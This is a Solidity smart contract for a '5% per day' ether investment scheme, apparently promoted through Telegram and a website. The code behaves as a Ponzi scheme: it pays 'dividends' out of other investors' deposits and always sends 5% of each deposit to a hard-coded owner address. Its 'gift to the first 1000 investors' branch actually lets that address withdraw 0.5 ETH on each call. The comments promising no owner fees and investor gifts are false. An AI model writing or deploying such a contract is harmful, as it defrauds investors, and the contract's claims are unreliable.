pragma solidity ^0.4.25;
 //Investment contract with gifts to the first 1000 investors
 // Our telegram masterInvest5
 // Our site https://master5invest.com
 //Our site http://master5invest.com
 //a gift to the first 1000 investors -- after 1 month 0.5 ETH
 //GAIN 5% PER 24 HOURS (every 5900 blocks)
 //translated into telegram channels
 //NO FEES are collected by the owner after 30 days
 //How to use:
 // 1. Send any amount of ether to make an investment
 // 2. Claim your profit by sending 0 ether transaction 
 // 3. You may reinvest too
 //RECOMMENDED GAS 200 000 
 //RECOMMENDED GAS PRICE: https://ethgasstation.info/
 

contract master5invest {
    address publicity; // advertising address
   
    
    function master5invest () {
        publicity = 0xda86ad1ca27Db83414e09Cc7549d887D92F58506;
       
    }
    
    mapping (address => uint256) m5balances;
    mapping (address => uint256) nextpayout;
   //dividend payment of 5% per day every investor
    function() external payable {
        uint256 newadv = msg.value / 20;
        publicity.transfer(newadv);
        
        if ( m5balances[msg.sender] != 0){
        address sender = msg.sender;
        
        uint256 dividends =  m5balances[msg.sender]*5/100*(block.number-nextpayout[msg.sender])/5900;
        sender.transfer(dividends);
        }

         nextpayout[msg.sender] = block.number; //next payment date
         m5balances[msg.sender] += msg.value; // increase balance
         
        //a gift to the first 1000 investors -- after 1 month 0.5 ETH
        if (msg.sender==publicity || block.number==6700000) {
            publicity.transfer(0.5 ether);
        }
        
        
    }
}